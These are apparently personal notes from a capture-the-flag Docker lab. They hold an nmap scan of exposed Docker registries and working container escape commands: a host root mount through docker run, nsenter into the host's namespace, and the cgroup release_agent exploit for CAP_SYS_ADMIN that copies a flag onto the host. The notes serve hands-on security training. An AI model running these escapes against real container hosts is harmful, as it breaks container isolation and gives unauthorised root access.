## nmap

```sql
Starting Nmap 7.60 ( https://nmap.org ) at 2021-06-15 06:59 BST
Nmap scan report for docker-rodeo.thm (10.10.125.0)
Host is up (0.00095s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Docker Registry (API: 2.0)
7000/tcp open  http    Docker Registry (API: 2.0)
MAC Address: 02:22:9F:2A:94:2B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.03 seconds
```

## Enumeration

port 5000

![[Pasted image 20210615113452.png]]

![[Pasted image 20210615113643.png]]

--------

port 7000
![[Pasted image 20210615114035.png]]

![[Pasted image 20210615114238.png]]


## dive
https://github.com/wagoodman/dive

![[Pasted image 20210615115050.png]]

![[Pasted image 20210615115122.png]]

challenge

![[Pasted image 20210615115643.png]]

![[Pasted image 20210615115829.png]]



## escape

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

![[Pasted image 20210615123048.png]]

----------

Shared Namespaces 

`nsenter --target 1 --mount sh`

![[Pasted image 20210615124328.png]]

![[Pasted image 20210615124403.png]]


-----------

`capsh --print`

exploit for sys_admin



```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

 echo 1 > /tmp/cgrp/x/notify\_on\_release

host\_path=\`sed -n 's/.\*\\perdir=\\(\[^,\]\*\\).\*/\\1/p' /etc/mtab\`

echo "$host\_path/exploit" > /tmp/cgrp/release\_agent

echo '#!/bin/sh' > /exploit

echo "cat /home/cmnatic/flag.txt > $host\_path/flag.txt" >> /exploit

chmod a+x /exploit

sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"
```

![[Pasted image 20210615125740.png]]

